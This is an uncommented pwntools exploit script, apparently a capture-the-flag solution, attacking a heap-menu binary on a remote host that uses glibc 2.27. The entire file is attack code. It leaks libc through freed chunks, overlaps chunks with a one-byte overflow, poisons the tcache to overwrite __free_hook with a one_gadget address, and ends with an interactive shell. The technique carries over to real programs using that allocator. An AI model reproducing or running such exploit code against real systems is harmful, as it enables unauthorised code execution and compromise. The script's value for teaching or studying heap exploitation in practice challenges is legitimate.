from pwn import *

context(arch='amd64', os='linux')

file_name = './z1r0'

debug = 1
if debug:
    r = remote('121.36.194.21', 49153)
else:
    r = process(file_name)

elf = ELF(file_name)

libc = ELF('libc-2.27.so')

menu = 'Your choice: '

def dbg():
    gdb.attach(r)

def new(index, size):
    r.sendlineafter(menu, '1')
    r.sendlineafter('Index: ', str(index))
    r.sendlineafter('Size: ', str(size))

def edit(index, content):
    r.sendlineafter(menu, '2')
    r.sendlineafter('Index: ', str(index))
    r.sendlineafter('Content: ', content)

def show(index):
    r.sendlineafter(menu, '3')
    r.sendlineafter('Index: ', str(index))

def delete(index):
    r.sendlineafter(menu, '4')
    r.sendlineafter('Index: ', str(index))


for i in range(7):
    new(i, 0x100)
new(7, 0x100)
new(8, 0x100)


for i in range(7):
    delete(i)

delete(7)

new(7, 0x10)

new(9, 0x18)
show(9)


libc_base = u64(r.recvuntil('\x7f')[-6:].ljust(8, b'\x00')) - 0x3ebca0
success('libc_base = ' + hex(libc_base))

free_hook = libc_base + libc.sym['__free_hook']
success('free_hook = ' + hex(free_hook))
one = [0x4f3d5, 0x4f432, 0x10a41c]
one_gadget = one[1] + libc_base

new(10, 0x10)
p1 = b'a' * 0x10 + p64(0x40) + b'\x41'
edit(9, p1)

delete(10)
new(10, 0x30)

new(11, 0x10)

delete(11)

p2 = p64(0) * 3 + p64(0x21) + p64(free_hook)
edit(10, p2)

new(12, 0x10)

new(13, 0x10)
edit(13, p64(one_gadget))


delete(12)


r.interactive()
